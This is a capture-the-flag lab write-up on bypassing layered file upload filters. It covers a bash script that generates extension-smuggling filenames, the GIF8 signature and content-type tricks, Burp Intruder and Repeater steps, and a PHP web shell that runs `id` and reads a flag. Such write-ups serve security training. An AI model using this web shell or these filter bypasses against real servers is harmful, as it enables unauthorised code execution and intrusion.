# Type Filters

The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

As the Lab suggests, the server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to guarantee that the file uploaded is an image.

So we must apply all the knowledge learned so far.

We start by capturing the request and send to the Intruder.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lets cover 3 components in this test:

* File extension - filename="§x§"
* Content-type - image/jpg
* File Signature - GIF8

We placed the `<?php echo "shell test";?>` to see if the php code was acttually executed.

To iterate the values of the file extensions let's create our own wordlist with the following script:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' 'php3' '.phar'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Copy the content to the Intruder's payload configuration and run it. Don't forget to untick the payload encoding checkbox.

We placed the `<?php echo "shell test";?>` to see if the php code was acttually executed.

When the Intruder finishes the attack we can order by length, since the successfully uploaded files have a length of 229 and 230.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now lets modify the Request by send it to the Repeater.

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We change the name (optional) to **shell.gif:.phar** and for the php code we change to this:

```php
<?php system($_REQUEST['cmd']); ?>
```



<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We do a simple just by execute the `id` command, as we can see from the output the above we manage to get a webshell!

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we just have to found the flag, that in our case is in our root directory.
